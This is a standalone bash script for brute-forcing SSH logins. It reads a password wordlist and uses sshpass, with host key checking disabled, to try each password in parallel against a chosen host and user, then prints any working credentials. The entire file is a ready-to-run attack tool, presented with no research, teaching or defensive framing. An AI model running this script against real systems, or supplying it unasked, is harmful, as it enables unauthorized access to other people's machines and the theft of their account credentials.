#!/bin/bash

# Configuration
HOST=""
PORT=22
USER=""
WORDLIST=""
THREADS=4
TIMEOUT=10

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--host)
            HOST="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -u|--user)
            USER="$2"
            shift 2
            ;;
        -w|--wordlist)
            WORDLIST="$2"
            shift 2
            ;;
        -t|--threads)
            THREADS="$2"
            shift 2
            ;;
        -T|--timeout)
            TIMEOUT="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Check required arguments
if [[ -z "$HOST" || -z "$USER" || -z "$WORDLIST" ]]; then
    echo "Usage: $0 --host <host> --user <user> --wordlist <file> [options]"
    exit 1
fi

echo "Starting SSH brute force on $HOST:$PORT"
echo "Target: $USER"
echo "Threads: $THREADS"
echo "Timeout: $TIMEOUT seconds"
echo "----------------------------------------"

# Load wordlist
mapfile -t PASSWORDS < "$WORDLIST"
echo "Loaded ${#PASSWORDS[@]} passwords"

# Function to try SSH login
try_ssh() {
    local password="$1"
    if sshpass -p "$password" ssh -o ConnectTimeout=$TIMEOUT -o StrictHostKeyChecking=no -p $PORT $USER@$HOST 'echo SUCCESS' 2>/dev/null | grep -q 'SUCCESS'; then
        echo "[SUCCESS] $USER:$password"
        return 0
    fi
    return 1
}

# Export function for parallel execution
export -f try_ssh
export HOST PORT USER TIMEOUT

# Run in parallel
printf "%s\n" "${PASSWORDS[@]}" | parallel -j $THREADS try_ssh {} || echo "No valid credentials found"
